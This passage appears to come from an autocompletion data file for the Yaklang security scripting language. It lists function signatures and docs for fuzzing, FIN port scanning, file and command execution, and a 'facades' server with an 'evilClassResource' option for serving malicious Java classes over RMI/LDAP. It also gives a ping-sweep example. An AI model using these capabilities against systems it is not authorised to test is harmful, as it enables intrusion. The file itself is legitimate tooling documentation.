            definitionStr: "context(ctx context.Context) HttpPoolConfigOption",
          },
          {
            functionName: "connPool(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "connPool(b bool) HttpPoolConfigOption",
          },
          {
            functionName: "concurrentLimit(${1:i /*type: int*/})",
            document: "",
            definitionStr: "concurrentLimit(i int) HttpPoolConfigOption",
          },
          {
            functionName: "NewRequest(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr: "NewRequest(raw []byte) (*FuzzRequest, error)",
          },
          {
            functionName: "MustNewRequest(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr: "MustNewRequest(raw []byte) *FuzzRequest",
          },
        ],
      },
      {
        libName: "fuzz",
        prefix: "fuzz.",
        functions: [
          {
            functionName:
              "showTag(${1:config /*type: *buildFuzzHTTPRequestConfig*/})",
            document: "",
            definitionStr: "showTag(config *buildFuzzHTTPRequestConfig) any",
          },
          {
            functionName: "proxy(${1:i /*type: string*/})",
            document: "",
            definitionStr: "proxy(i string) BuildFuzzHTTPRequestOption",
          },
          {
            functionName: "noEncode(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "noEncode(i bool) BuildFuzzHTTPRequestOption",
          },
          {
            functionName: "https(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "https(i bool) BuildFuzzHTTPRequestOption",
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              "context(ctx context.Context) BuildFuzzHTTPRequestOption",
          },
          {
            functionName: "WithTimeOut(${1:f /*type: float64*/})",
            document: "",
            definitionStr: "WithTimeOut(f float64) HttpPoolConfigOption",
          },
          {
            functionName: "WithNamingContext(${1:invokerName /*type: string*/})",
            document: "",
            definitionStr:
              "WithNamingContext(invokerName string) HttpPoolConfigOption",
          },
          {
            functionName: "WithDelay(${1:b /*type: float64*/})",
            document: "",
            definitionStr: "WithDelay(b float64) HttpPoolConfigOption",
          },
          {
            functionName: "WithConcurrentLimit(${1:i /*type: int*/})",
            document: "",
            definitionStr: "WithConcurrentLimit(i int) HttpPoolConfigOption",
          },
          {
            functionName: "UrlsToHTTPRequests(${1:target...})",
            document: "",
            definitionStr:
              "UrlsToHTTPRequests(target ...any) (*FuzzHTTPRequestBatch any, error any)",
          },
          {
            functionName:
              "UrlToHTTPRequest(${1:method /*type: string*/}, ${2:i})",
            document: "",
            definitionStr:
              "UrlToHTTPRequest(method string, i any) (*mutate.FuzzHTTPRequest, error)",
          },
          {
            functionName: "StringsWithParam(${1:i}, ${2:i2})",
            document: "",
            definitionStr: "StringsWithParam(i any, i2 any) []string",
          },
          {
            functionName:
              "StringsFunc(${1:i}, ${2:cb /*type: func(i *mutate.MutateResult)*/}, ${3:params...})",
            document: "",
            definitionStr:
              "StringsFunc(i any, cb func(i *mutate.MutateResult), params ...any) error",
          },
          {
            functionName: "Strings(${1:i})",
            document: "",
            definitionStr: "Strings(i any) []string  doc:fuzz\n",
          },
          {
            functionName: "ProtobufYAML(${1:i})",
            document: "",
            definitionStr: "ProtobufYAML(i any) *ProtobufRecords",
          },
          {
            functionName: "ProtobufJSON(${1:i})",
            document: "",
            definitionStr: "ProtobufJSON(i any) *ProtobufRecords",
          },
          {
            functionName: "ProtobufHex(${1:i})",
            document: "",
            definitionStr: "ProtobufHex(i any) *ProtobufRecords",
          },
          {
            functionName: "ProtobufBytes(${1:i})",
            document: "",
            definitionStr: "ProtobufBytes(i any) *ProtobufRecords",
          },
          {
            functionName: "MustHTTPRequest(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              "MustHTTPRequest(i any, opts ...BuildFuzzHTTPRequestOption) *FuzzHTTPRequest",
          },
          {
            functionName: "HTTPRequest(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              "HTTPRequest(i any, opts ...BuildFuzzHTTPRequestOption) (*FuzzHTTPRequest, error)",
          },
          {
            functionName: "FuzzCalcExprInt64Safe()",
            document: "",
            definitionStr: "FuzzCalcExprInt64Safe() map[string]any",
          },
          {
            functionName: "FuzzCalcExprInt32Safe()",
            document: "",
            definitionStr: "FuzzCalcExprInt32Safe() map[string]any",
          },
          {
            functionName: "FuzzCalcExpr()",
            document: "",
            definitionStr: "FuzzCalcExpr() map[string]any",
          },
        ],
      },
      {
        libName: "finscan",
        prefix: "finscan.",
        functions: [
          {
            functionName: "wait(${1:sec /*type: float64*/})",
            document: "",
            definitionStr:
              "wait(sec float64) finScanOpt  doc:finscan 发出 FIN 包后等待多久？\n",
          },
          {
            functionName:
              "rateLimit(${1:ms /*type: int*/}, ${2:count /*type: int*/})",
            document: "",
            definitionStr: "rateLimit(ms int, count int) finScanOpt",
          },
          {
            functionName: "outputPrefix(${1:prefix /*type: string*/})",
            document: "",
            definitionStr:
              "outputPrefix(prefix string) finScanOpt  doc:端口开放结果保存文件加个前缀，比如 tcp:// https:// http:// 等\n",
          },
          {
            functionName: "outputFile(${1:file /*type: string*/})",
            document: "",
            definitionStr:
              "outputFile(file string) finScanOpt  doc:端口开放的结果保存到文件\n",
          },
          {
            functionName: "initPortFilter(${1:f /*type: string*/})",
            document: "",
            definitionStr: "initPortFilter(f string) finScanOpt",
          },
          {
            functionName: "initHostFilter(${1:f /*type: string*/})",
            document: "",
            definitionStr: "initHostFilter(f string) finScanOpt",
          },
          {
            functionName: "excludePorts(${1:ports /*type: string*/})",
            document: "",
            definitionStr: "excludePorts(ports string) finScanOpt",
          },
          {
            functionName: "excludeHosts(${1:hosts /*type: string*/})",
            document: "",
            definitionStr: "excludeHosts(hosts string) finScanOpt",
          },
          {
            functionName: "concurrent(${1:count /*type: int*/})",
            document: "",
            definitionStr:
              "concurrent(count int) finScanOpt  doc:设置 FIN 扫描的并发可以有效控制精准度\n",
          },
          {
            functionName:
              "Scan(${1:target /*type: string*/}, ${2:port /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "Scan(target string, port string, opts ...finScanOpt) (chan *finscan.FinScanResult, error)",
          },
        ],
      },
      {
        libName: "filesys",
        prefix: "filesys.",
        functions: [
          {
            functionName:
              "onStat(${1:h /*type: func(isDir bool, pathname string, info os.FileInfo)*/})",
            document: "",
            definitionStr:
              "onStat(h func(isDir bool, pathname string, info os.FileInfo)) Option  doc:onStat will be called when the walker met one file description.\n",
          },
          {
            functionName:
              "onReady(${1:h /*type: func(name string, isDir bool)*/})",
            document: "",
            definitionStr:
              "onReady(h func(name string, isDir bool)) Option  doc:onReady will be called when the walker is ready to start walking.\n",
          },
          {
            functionName:
              "onFileStat(${1:h /*type: func(pathname string, info os.FileInfo)*/})",
            document: "",
            definitionStr:
              "onFileStat(h func(pathname string, info os.FileInfo)) Option  doc:onFileStat will be called when the walker met one file.\n",
          },
          {
            functionName:
              "onDirStat(${1:h /*type: func(pathname string, info os.FileInfo)*/})",
            document: "",
            definitionStr:
              "onDirStat(h func(pathname string, info os.FileInfo)) Option  doc:onDirStat will be called when the walker met one directory.\n",
          },
          {
            functionName: "dir(${1:globDir /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr: "dir(globDir string, opts ...Option) Option",
          },
          {
            functionName: "Recursive(${1:raw /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Recursive(raw string, opts ...Option) error  doc:Recursive recursively walk through the file system\n\nraw: the root path\n\nopts: options\n\nreturn: error\n\n\n\nExample:\n```\nerr := filesys.Recursive( //\n\n\t"testdata",\n\tfilesys.dir(["cc", "dd"], filesys.onFileStat((name, info) => {})),\n\n)\n```\n',
          },
        ],
      },
      {
        libName: "file",
        prefix: "file.",
        functions: [
          {
            functionName:
              "Walk(${1:uPath /*type: string*/}, ${2:i /*type: func(info *utils.FileInfo) bool*/})",
            document: "",
            definitionStr:
              'Walk(uPath string, i func(info *utils.FileInfo) bool) error  doc:Walk 遍历一个目录下的所有文件和目录，返回错误\n\nExample:\n```\nfile.Walk("/tmp", func(info) {println(info.Name); return true})~\n```\n',
          },
          {
            functionName: "TempFileName()",
            document: "",
            definitionStr:
              'TempFileName() (string, error)  doc:TempFileName 创建一个临时文件，返回一个文件名与错误\n\nExample:\n```\nname, err = file.TempFileName()\ndie(err)\ndefer os.Remove(name)\nfile.Save(name, "hello yak")\n```\n',
          },
          {
            functionName: "TempFile(${1:dirPart...})",
            document: "",
            definitionStr:
              'TempFile(dirPart ...string) (*_yakFile, error)  doc:TempFile 创建一个临时文件，返回一个文件结构体引用与错误\n\nExample:\n```\nf, err = file.TempFile()\ndie(err)\ndefer f.Close()\nf.WriteString("hello yak")\n```\n',
          },
          {
            functionName:
              "TailF(${1:i /*type: string*/}, ${2:line /*type: func(i string)*/})",
            document: "",
            definitionStr:
              'TailF(i string, line func(i string))  doc:TailF 模拟 unix 命令 tail -f，执行这个函数会一直阻塞，打印文件内容到标准输出，如果文件有变化，会自动打印新的内容\n\nExample:\n```\nfile.TailF("/tmp/test.txt")\n```\n',
          },
          {
            functionName: "Stat(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Stat(name string) (os.FileInfo, error)  doc:Stat 返回一个文件的信息和错误\n\nExample:\n```\ninfo, err = file.Stat("/tmp/test.txt")\ndesc(info)\n```\n',
          },
          {
            functionName: "Split(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'Split(path string) (string, string)  doc:Split 以操作系统的默认路径分隔符分割路径，返回目录和文件名\n\nExample:\n```\nfile.Split("/usr/bin/bash") // "/usr/bin", "bash"\n```\n',
          },
          {
            functionName: "SaveJson(${1:name /*type: string*/}, ${2:i})",
            document: "",
            definitionStr:
              'SaveJson(name string, i any) error  doc:SaveJson 将字符串或字节切片或字符串切片写入到文件中，如果文件不存在则创建，如果文件存在则覆盖，返回错误\n\n与 Save 不同的是，如果传入的参数是其他类型，会尝试将其序列化为 json 字符再写入到文件中\n\nExample:\n```\nfile.SaveJson("/tmp/test.txt", "hello yak")\n```\n',
          },
          {
            functionName: "Save(${1:fileName /*type: string*/}, ${2:i})",
            document: "",
            definitionStr:
              'Save(fileName string, i any) error  doc:Save 将字符串或字节切片或字符串切片写入到文件中，如果文件不存在则创建，如果文件存在则覆盖，返回错误\n\nExample:\n```\nfile.Save("/tmp/test.txt", "hello yak")\n```\n',
          },
          {
            functionName: "SEPARATOR",
            document: "file.SEPARATOR: string",
            definitionStr: "file.SEPARATOR: string",
          },
          {
            functionName: "Rm(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'Rm(path string) error  doc:Rm 删除路径及其包含的所有子路径，它是 Remove 的别名\n\nExample:\n```\n// 假设存在 /tmp/test/test.txt 文件和 /tmp/test/test2.txt 文件\nerr = file.Remove("/tmp/test")\n```\n',
          },
          {
            functionName:
              "Rename(${1:oldpath /*type: string*/}, ${2:newpath /*type: string*/})",
            document: "",
            definitionStr:
              'Rename(oldpath string, newpath string) error  doc:Rename 重命名一个文件或文件夹，返回错误，这个函数也会移动文件或文件夹\n\n! 在 windows 下，无法将文件移动到不同的磁盘\n\nExample:\n```\n// 假设存在 /tmp/test.txt 文件\nerr = file.Rename("/tmp/test.txt", "/tmp/test2.txt")\n```\n',
          },
          {
            functionName: "Remove(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'Remove(path string) error  doc:Remove 删除路径及其包含的所有子路径\n\nExample:\n```\n// 假设存在 /tmp/test/test.txt 文件和 /tmp/test/test2.txt 文件\nerr = file.Remove("/tmp/test")\n```\n',
          },
          {
            functionName:
              "ReadLinesWithCallback(${1:i}, ${2:callback /*type: func(string)*/})",
            document: "",
            definitionStr:
              'ReadLinesWithCallback(i any, callback func(string)) error  doc:ReadLinesWithCallback 尝试读取一个文件中的所有行，每读取一行，便会调用回调函数，返回错误\n\nExample:\n```\nerr = file.ReadLinesWithCallback("/tmp/test.txt", func(line) { println(line) })\n```\n',
          },
          {
            functionName: "ReadLines(${1:i})",
            document: "",
            definitionStr:
              'ReadLines(i any) []string  doc:ReadLines 尝试读取一个文件中的所有行，返回一个字符串切片，会去除BOM头和空行\n\nExample:\n```\nlines = file.ReadLines("/tmp/test.txt")\n```\n',
          },
          {
            functionName: "ReadFileInfoInDirectory(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'ReadFileInfoInDirectory(path string) ([]*utils.FileInfo, error)  doc:ReadFileInfoInDirectory 读取一个目录下的所有文件信息，返回一个文件信息切片和错误\n\nExample:\n```\nfor f in file.ReadFileInfoInDirectory("/tmp")~ {\nprintln(f.Name)\n}\n```\n',
          },
          {
            functionName: "ReadFile(${1:filename /*type: string*/})",
            document: "",
            definitionStr:
              'ReadFile(filename string) ([]byte, error)  doc:ReadFile 读取一个文件的所有内容，返回字节切片与错误\n\nExample:\n```\ncontent, err = file.ReadFile("/tmp/test.txt")\n```\n',
          },
          {
            functionName: "ReadDirInfoInDirectory(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'ReadDirInfoInDirectory(path string) ([]*utils.FileInfo, error)  doc:ReadDirInfoInDirectory 读取一个目录下的所有目录信息，返回一个文件信息切片和错误\n\nExample:\n```\nfor d in file.ReadDirInfoInDirectory("/tmp")~ {\nprintln(d.Name)\n}\n```\n',
          },
          {
            functionName: "ReadAll(${1:r /*type: io.Reader*/})",
            document: "",
            definitionStr:
              'ReadAll(r io.Reader) ([]byte, error)  doc:ReadAll 从 Reader 读取直到出现错误或 EOF，然后返回字节切片与错误\n\nExample:\n```\nf, err = file.Open("/tmp/test.txt")\ncontent, err = file.ReadAll(f)\n```\n',
          },
          {
            functionName:
              "OpenFile(${1:name /*type: string*/}, ${2:flags /*type: int*/}, ${3:mode /*type: os.FileMode*/})",
            document: "",
            definitionStr:
              'OpenFile(name string, flags int, mode os.FileMode) (*_yakFile, error)  doc:OpenFile 打开一个文件，使用 file.O_CREATE ... 和权限控制，返回一个文件结构体引用与错误\n\nExample:\n```\nf = file.OpenFile("/tmp/test.txt", file.O_CREATE|file.O_RDWR, 0o777)~; defer f.Close()\n```\n',
          },
          {
            functionName: "Open(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Open(name string) (*_yakFile, error)  doc:Open 打开一个文件，返回一个文件结构体引用与错误\n\nExample:\n```\nf, err = file.Open("/tmp/test.txt")\ncontent, err = file.ReadAll(f)\n```\n',
          },
          {
            functionName: "O_WRONLY",
            document: "file.O_WRONLY: int = 0x1",
            definitionStr: "file.O_WRONLY: int = 0x1",
          },
          {
            functionName: "O_TRUNC",
            document: "file.O_TRUNC: int = 0x200",
            definitionStr: "file.O_TRUNC: int = 0x200",
          },
          {
            functionName: "O_SYNC",
            document: "file.O_SYNC: int = 0x1000",
            definitionStr: "file.O_SYNC: int = 0x1000",
          },
          {
            functionName: "O_RDWR",
            document: "file.O_RDWR: int = 0x2",
            definitionStr: "file.O_RDWR: int = 0x2",
          },
          {
            functionName: "O_RDONLY",
            document: "file.O_RDONLY: int = 0x0",
            definitionStr: "file.O_RDONLY: int = 0x0",
          },
          {
            functionName: "O_EXCL",
            document: "file.O_EXCL: int = 0x80",
            definitionStr: "file.O_EXCL: int = 0x80",
          },
          {
            functionName: "O_CREATE",
            document: "file.O_CREATE: int = 0x40",
            definitionStr: "file.O_CREATE: int = 0x40",
          },
          {
            functionName: "O_APPEND",
            document: "file.O_APPEND: int = 0x400",
            definitionStr: "file.O_APPEND: int = 0x400",
          },
          {
            functionName: "NewMultiFileLineReader(${1:files...})",
            document: "",
            definitionStr:
              'NewMultiFileLineReader(files ...string) (*mfreader.MultiFileLineReader, error)  doc:NewMultiFileLineReader 创建一个多文件读取器，返回一个多文件读取器结构体引用和错误\n\nExample:\n```\n// 假设存在 /tmp/test.txt 文件，内容为 123\n// 假设存在 /tmp/test2.txt 文件，内容为 456\nm, err = file.NewMultiFileLineReader("/tmp/test.txt", "/tmp/test2.txt")\nfor m.Next() {\nprintln(m.Text())\n}\n```\n',
          },
          {
            functionName:
              "Mv(${1:oldpath /*type: string*/}, ${2:newpath /*type: string*/})",
            document: "",
            definitionStr:
              'Mv(oldpath string, newpath string) error  doc:Mv 重命名一个文件或文件夹，返回错误，这个函数也会移动文件或文件夹，它是 Rename 的别名\n\n! 在 windows 下，无法将文件移动到不同的磁盘\n\nExample:\n```\n// 假设存在 /tmp/test.txt 文件\nerr = file.Rename("/tmp/test.txt", "/tmp/test2.txt")\n```\n',
          },
          {
            functionName: "MkdirAll(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'MkdirAll(name string) error  doc:MkdirAll 创建一个递归创建一个目录，返回错误\n\nExample:\n```\n// 假设存在 /tmp 目录，不存在 /tmp/test 目录\nerr = file.MkdirAll("/tmp/test/test2")\n```\n',
          },
          {
            functionName: "Mkdir(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Mkdir(name string) error  doc:Mkdir 创建一个目录，返回错误\n\nExample:\n```\nerr = file.Mkdir("/tmp/test")\n```\n',
          },
          {
            functionName: "Lstat(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Lstat(name string) (os.FileInfo, error)  doc:Lstat 返回一个文件的信息和错误，如果文件是一个符号链接，返回的是符号链接的信息\n\nExample:\n```\ninfo, err = file.Lstat("/tmp/test.txt")\ndesc(info)\n```\n',
          },
          {
            functionName: "Ls(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'Ls(i string) []*utils.FileInfo  doc:Dir 列出一个目录下的所有文件和目录，返回一个文件信息切片，它是 Ls 的别名\n\nExample:\n```\nfor f in file.Ls("/tmp") {\nprintln(f.Name)\n}\n```\n',
          },
          {
            functionName: "Join(${1:path...})",
            document: "",
            definitionStr:
              'Join(path ...string) string  doc:Join 将任意数量的路径以默认路径分隔符链接在一起\n\nExample:\n```\nfile.Join("/usr", "bin", "bash") // "/usr/bin/bash"\n```\n',
          },
          {
            functionName: "IsLink(${1:file /*type: string*/})",
            document: "",
            definitionStr:
              'IsLink(file string) bool  doc:IsLink 判断文件是否是一个符号链接\n\nExample:\n```\n假设 /usr/bin/bash 是一个符号链接，指向 /bin/bash\nfile.IsLink("/usr/bin/bash") // true\nfile.IsLink("/bin/bash") // false\n```\n',
          },
          {
            functionName: "IsFile(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'IsFile(path string) bool  doc:IsFile 判断路径是否存在且是一个文件\n\nExample:\n```\n// 假设存在 /usr/bin/bash 文件\nfile.IsFile("/usr/bin/bash") // true\nfile.IsFile("/usr/bin") // false\n```\n',
          },
          {
            functionName: "IsExisted(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'IsExisted(path string) bool  doc:IsExisted 判断文件或目录是否存在\n\nExample:\n```\nfile.IsExisted("/usr/bin/bash")\n```\n',
          },
          {
            functionName: "IsDir(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'IsDir(path string) bool  doc:IsDir 判断路径是否存在且是一个目录\n\nExample:\n```\n// 假设存在 /usr/bin/bash 文件\nfile.IsDir("/usr/bin") // true\nfile.IsDir("/usr/bin/bash") // false\n```\n',
          },
          {
            functionName: "IsAbs(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'IsAbs(path string) bool  doc:IsAbs 判断路径是否是绝对路径\n\nExample:\n```\nfile.IsAbs("/usr/bin/bash") // true\nfile.IsAbs("../../../usr/bin/bash") // false\n```\n',
          },
          {
            functionName: "GetExt(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'GetExt(s string) string  doc:GetExt 获取文件的扩展名\n\nExample:\n```\nfile.GetExt("/tmp/test.txt") // ".txt"\n```\n',
          },
          {
            functionName: "GetDirPath(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'GetDirPath(path string) string  doc:GetDirPath 返回路径中除最后一个元素之后的路径，这通常是原本路径的目录\n\nExample:\n```\nfile.GetDirPath("/usr/bin/bash") // "/usr/bin/"\n```\n',
          },
          {
            functionName: "GetBase(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'GetBase(s string) string  doc:GetBase 获取文件的基本名\n\nExample:\n```\nfile.GetBase("/tmp/test.txt") // "test.txt"\n```\n',
          },
          {
            functionName: "Dir(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'Dir(i string) []*utils.FileInfo  doc:Ls 列出一个目录下的所有文件和目录，返回一个文件信息切片\n\nExample:\n```\nfor f in file.Ls("/tmp") {\nprintln(f.Name)\n}\n```\n',
          },
          {
            functionName: "Create(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Create(name string) (*_yakFile, error)  doc:Create 创建一个文件，返回一个文件结构体引用与错误\n\nExample:\n```\nf, err = file.Create("/tmp/test.txt")\n```\n',
          },
          {
            functionName:
              "Cp(${1:src /*type: string*/}, ${2:dst /*type: string*/})",
            document: "",
            definitionStr:
              'Cp(src string, dst string) error  doc:Cp 拷贝文件或目录，返回错误\n\nExample:\n```\nfile.Cp("/tmp/test.txt", "/tmp/test2.txt")\nfile.Cp("/tmp/test", "/root/tmp/test")\n```\n',
          },
          {
            functionName: "Clean(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'Clean(s string) string  doc:Clean 清理路径中的多余的分隔符和 . 和 ..\n\nExample:\n```\nfile.Clean("/tmp/../tmp/test.txt") // "/tmp/test.txt"\n```\n',
          },
          {
            functionName: "Cat(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'Cat(i string)  doc:Cat 模拟 unix 命令 cat，打印文件内容到标准输出\n\nExample:\n```\nfile.Cat("/tmp/test.txt")\n```\n',
          },
          {
            functionName: "Abs(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'Abs(i string) string  doc:Abs 返回一个路径的绝对路径\n\nExample:\n```\n// 假设当前目录是 /tmp\nfile.Abs("./test.txt") // /tmp/test.txt\n```\n',
          },
        ],
      },
      {
        libName: "facades",
        prefix: "facades.",
        functions: [
          {
            functionName:
              "rmiResourceAddr(${1:name /*type: string*/}, ${2:rmiResourceAddr /*type: string*/})",
            document: "",
            definitionStr:
              "rmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig",
          },
          {
            functionName: "objectClass(${1:obj /*type: string*/})",
            document: "",
            definitionStr: "objectClass(obj string) FacadeServerConfig",
          },
          {
            functionName:
              "ldapResourceAddr(${1:name /*type: string*/}, ${2:addr /*type: string*/})",
            document: "",
            definitionStr:
              "ldapResourceAddr(name string, addr string) FacadeServerConfig",
          },
          {
            functionName: "javaFactory(${1:factory /*type: string*/})",
            document: "",
            definitionStr: "javaFactory(factory string) FacadeServerConfig",
          },
          {
            functionName: "javaCodeBase(${1:codeBase /*type: string*/})",
            document: "",
            definitionStr: "javaCodeBase(codeBase string) FacadeServerConfig",
          },
          {
            functionName: "javaClassName(${1:name /*type: string*/})",
            document: "",
            definitionStr: "javaClassName(name string) FacadeServerConfig",
          },
          {
            functionName:
              "httpResource(${1:name /*type: string*/}, ${2:resource /*type: []byte*/})",
            document: "",
            definitionStr:
              "httpResource(name string, resource []byte) FacadeServerConfig",
          },
          {
            functionName:
              "evilClassResource(${1:name /*type: string*/}, ${2:rmiResourceAddr /*type: string*/})",
            document: "",
            definitionStr:
              "evilClassResource(name string, rmiResourceAddr string) FacadeServerConfig",
          },
          {
            functionName:
              "Serve(${1:host /*type: string*/}, ${2:port /*type: int*/}, ${3:configs...})",
            document: "",
            definitionStr:
              "Serve(host string, port int, configs ...FacadeServerConfig) error",
          },
          {
            functionName:
              "NewFacadeServer(${1:host /*type: string*/}, ${2:port /*type: int*/}, ${3:configs...})",
            document: "",
            definitionStr:
              "NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *FacadeServer",
          },
        ],
      },
      {
        libName: "exec",
        prefix: "exec.",
        functions: [
          {
            functionName: "timeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              'timeout(i float64) execPoolOpt  doc:timeout 是一个选项参数，用于设置批量命令执行的超时时间，单位为秒\n\nExample:\n```\nexec.SystemBatch("ping 192.168.1.{{int(1-100)}}",\nexec.timeout(10),\nexec.concurrent(20),\nexec.callback(func(cmd, result) {\nlog.Infof("exec[%v] result: %v", cmd, string(result))\n})\n```\n',
          },
          {
            functionName: "concurrent(${1:i /*type: int*/})",
            document: "",
            definitionStr:
              'concurrent(i int) execPoolOpt  doc:concurrent 是一个选项参数，用于设置批量命令执行的并发数，默认为 20\n\nExample:\n```\nexec.SystemBatch("ping 192.168.1.{{int(1-100)}}",\nexec.timeout(10),\nexec.concurrent(20),\nexec.callback(func(cmd, result) {\nlog.Infof("exec[%v] result: %v", cmd, string(result))\n})\n```\n',
          },
          {
            functionName: "callback(${1:f /*type: func(string, []byte)*/})",
            document: "",
            definitionStr:
              'callback(f func(string, []byte)) execPoolOpt  doc:callback 是一个选项参数，用于设置批量命令执行的回调函数，回调函数的第一个参数为执行的命令，第二个参数为执行的结果，在回调函数中可以对命令执行结果进行处理\n\nExample:\n```\nexec.SystemBatch("ping 192.168.1.{{int(1-100)}}",\nexec.timeout(10),\nexec.concurrent(20),\nexec.callback(func(cmd, result) {\nlog.Infof("exec[%v] result: %v", cmd, string(result))\n})\n```\n',
          },
          {
            functionName:
              "WatchStdout(${1:i /*type: string*/}, ${2:timeout /*type: float64*/}, ${3:f /*type: func(raw []byte) bool*/})",
            document: "",
            definitionStr:
              'WatchStdout(i string, timeout float64, f func(raw []byte) bool) error  doc:WatchStdout 执行命令并监控标准输出，当标准输出有数据时，会调用回调函数处理数据，回调函数的参数为标准输出的原始数据，返回值为是否继续监控\n\nExample:\n```\nexec.WatchStdout("tail -f /tmp/log", 60, func(raw) {\nlog.Infof("stdout: %v", string(raw))\nreturn true\n}\n```\n',
          },
          {
            functionName:
              "WatchStderr(${1:i /*type: string*/}, ${2:timeout /*type: float64*/}, ${3:f /*type: func(raw []byte) bool*/})",
            document: "",
            definitionStr:
              'WatchStderr(i string, timeout float64, f func(raw []byte) bool) error  doc:WatchStderr 执行命令并监控标准错误，当标准错误有数据时，会调用回调函数处理数据，回调函数的参数为标准错误的原始数据，返回值为是否继续监控\n\nExample:\n```\nexec.WatchStderr("tail -f /tmp/log", 60, func(raw) {\nlog.Infof("stderr: %v", string(raw))\nreturn true\n}\n```\n',
          },
          {
            functionName:
              "WatchOutput(${1:i /*type: string*/}, ${2:timeout /*type: float64*/}, ${3:f /*type: func(raw []byte) bool*/})",
            document: "",
            definitionStr:
              'WatchOutput(i string, timeout float64, f func(raw []byte) bool) error  doc:WatchStdout 执行命令并监控标准输出，当标准输出有数据时，会调用回调函数处理数据，回调函数的参数为标准输出的原始数据，返回值为是否继续监控\n\nExample:\n```\nexec.WatchStdout("tail -f /tmp/log", 60, func(raw) {\nlog.Infof("stdout: %v", string(raw))\nreturn true\n}\n```\n',
          },
          {
            functionName:
              "SystemContext(${1:ctx /*type: context.Context*/}, ${2:i /*type: string*/})",
            document: "",
            definitionStr:
              'SystemContext(ctx context.Context, i string) ([]byte, error)  doc:SystemContext 创建受上下文控制的命令结构体并执行，返回结果与错误\n\nExample:\n```\noutput, err = exec.SystemContext(context.New(),"ls -al")~\ndump(output)\n```\n',
          },
          {
            functionName: "SystemBatch(${1:i /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'SystemBatch(i string, opts ...execPoolOpt)  doc:SystemBatch 批量执行命令，它的第一个参数为要批量执行的命令(支持 fuzztag )，接下来可以接收零个到多个选项，用于对批量命令执行进行配置，例如设置超时时间，回调函数等\n\nExample:\n```\nexec.SystemBatch("ping 192.168.1.{{int(1-100)}}",\nexec.timeout(10),\nexec.concurrent(20),\nexec.callback(func(cmd, result) {\nlog.Infof("exec[%v] result: %v", cmd, string(result))\n})\n```\n',
          },
          {
            functionName: "System(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'System(i string) ([]byte, error)  doc:System 创建命令结构体并执行，返回结果与错误\n\nExample:\n```\noutput, err = exec.System("ls -al")~\ndump(output)\n```\n',
          },
          {
            functionName:
              "CommandContext(${1:ctx /*type: context.Context*/}, ${2:s /*type: string*/})",
            document: "",
            definitionStr:
              'CommandContext(ctx context.Context, s string) (*exec.Cmd, error)  doc:CommandContext 创建一个受上下文控制的命令结构体，其第一个参数是上下文，第二个参数是要执行的命令\n\nExample:\n```\ncmd = exec.CommandContext(context.New(), "ls -al")\noutput = cmd.CombineOutput()~\ndump(output)\n```\n',
          },
          {
            functionName: "Command(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'Command(s string) (*exec.Cmd, error)  doc:Command 创建一个命令结构体\n\nExample:\n```\ncmd = exec.Command("ls -al")\noutput = cmd.CombineOutput()~\ndump(output)\n```\n',
          },
          {
            functionName: "CheckCrash(${1:c /*type: *exec.Cmd*/})",
            document: "",
            definitionStr:
              'CheckCrash(c *exec.Cmd) (bool, error)  doc:CheckCrash 检查命令执行是否发生了崩溃，不支持 Windows 系统，返回值为是否崩溃和错误信息\n\nExample:\n```\ncmd = exec.Command("ls -al")~\nisCrash = exec.CheckCrash(cmd)~\nif isCrash {\n// ...\n}\n```\n',
          },
        ],
      },
      {
        libName: "env",
        prefix: "env.",
        functions: [
          {
            functionName:
              "Set(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'Set(key string, value string)  doc:Set 设置对应键名的环境变量值\n\n! 已弃用，可以使用 `os.Setenv` 代替\n\nExample:\n```\nenv.Set("YAK_PROXY", "http://127.0.0.1:10808")\n```\n',
          },
          {
            functionName: "Get(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'Get(key string) string  doc:Get 获取对应键名的环境变量值\n\n! 已弃用，可以使用 `os.Getenv` 代替\n\nExample:\n```\nenv.Get("PATH")\n```\n',
          },
        ],
      },
      {
        libName: "dyn",
        prefix: "dyn.",
        functions: [
          {
            functionName: "recursive(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "recursive(i bool) yakEvalConfigOpt",
          },
          {
            functionName: "params(${1:i /*type: map[string]any*/})",
            document: "",
            definitionStr: "params(i map[string]any) yakEvalConfigOpt",
          },
          {
